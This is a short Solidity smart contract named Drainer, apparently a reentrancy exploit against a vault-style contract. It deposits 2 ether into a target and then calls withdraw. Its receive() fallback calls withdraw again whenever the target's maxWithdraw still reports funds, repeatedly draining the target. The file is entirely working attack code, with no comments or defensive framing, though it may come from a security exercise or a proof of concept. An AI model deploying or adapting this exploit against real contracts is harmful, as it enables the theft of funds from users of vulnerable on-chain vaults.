// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

contract Drainer {
    address target;
    event log(bool);

    constructor(address _target) {
        target = _target;
    }

    function callDeposit() payable public {
        require(msg.value == 2 ether);
        (bool res,) = target.call{value: msg.value}(abi.encodeWithSignature("deposit(uint256,address)", msg.value, address(this)));
        emit log(res);
        require(res == true, "despoit call failed");
    }

    function callWithdraw() public {
        (bool res,) = target.call(abi.encodeWithSignature("withdraw(uint256,address,address)", 1 ether, address(this), address(this)));
        require(res == true, "withdraw call failed");
    }

    receive() payable external {
        (bool res, bytes memory data) = target.call(abi.encodeWithSignature("maxWithdraw(address)", address(this)));
        require(res, "check withdraw failed");

        uint256 leftOverWithdraw = abi.decode(data,(uint256));

        if (leftOverWithdraw != 0) {
            callWithdraw();
        }
    }
}
